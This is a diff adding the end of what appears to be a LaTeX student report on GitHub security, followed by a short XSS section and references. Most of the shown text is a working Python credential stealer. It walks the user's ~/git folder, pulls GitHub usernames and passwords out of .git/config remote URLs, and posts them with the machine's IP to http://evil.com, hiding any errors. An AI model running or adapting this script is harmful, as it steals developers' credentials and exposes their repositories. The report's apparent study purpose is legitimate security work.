@@ -1,0 +1,68 @@
+#!/usr/bin/env python
+
+import urllib, urllib2, sys, socket, re, os
+
+ip = socket.gethostbyname(socket.gethostname())
+
+
+files = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser("~/git")) for f in fn]
+
+for cur in files:
+    p1 = re.compile('\.git\/config$')
+    p2 = re.compile('\/\/(.+):(.+)@github.com')
+    m = p1.findall(cur)
+    if not(m == []):
+        f = open(cur, 'r')
+        l = []
+        for lines in f:
+                l.append(lines)
+
+        mess = ''.join(l).replace('\n', '')
+        m2 = re.match(r".+\/\/(.+):(.+)@github.com.+", mess)
+        if m2:
+            results = (m2.group(1), m2.group(2))
+            '''
+            Here, you can use whatever URL you want. I used localhost, and there
+            is sample code in index.js which can be used to accept incoming
+            post requests.
+            '''
+            url = 'http://evil.com'
+            values = {'username' : results[0],
+                      'password' : results[1],
+                      'ip' : ip }
+
+            try:
+                data = urllib.urlencode(values)
+                req = urllib2.Request(url, data)
+                response = urllib2.urlopen(req)
+                the_page = response.read()
+            except:
+                pass
+\end{python}
+
+
+
+
+
+
+%XSS Section
+\section{XSS}
+
+Github has two major protections against cross-site-scripting (XSS) attacks. The first is the standard Ruby on Rails library to encode html tags as their number equivalent. So the \tt{$<$div$>$} tag is encoded as \tt{\&lt;div\&gt;} but still renders the name. The second defense against XSS is wrapping results from the html
+
+\begin{lstlisting}
+<%=h "<p> will be preserved" %>
+\end{lstlisting}
+
+
+
+
+\section{References}\label{references}
+\begin{enumerate}
+\item We used this this online tool to fingerprint the browser much in the same way that Google Analytics does.\\ \url{https://panopticlick.eff.org/index.php?action=log&js=yes}
+
+\item There was an attack that's still possible listed here: \url{http://www.devfactor.net/2014/12/30/2375-amazon-mistake/}
+\item Evidence the chinese targeted github.com in a ddos attack \url{https://citizenlab.org/2015/04/chinas-great-cannon/}
+\end{enumerate}
+\end{document}
+This is never printed
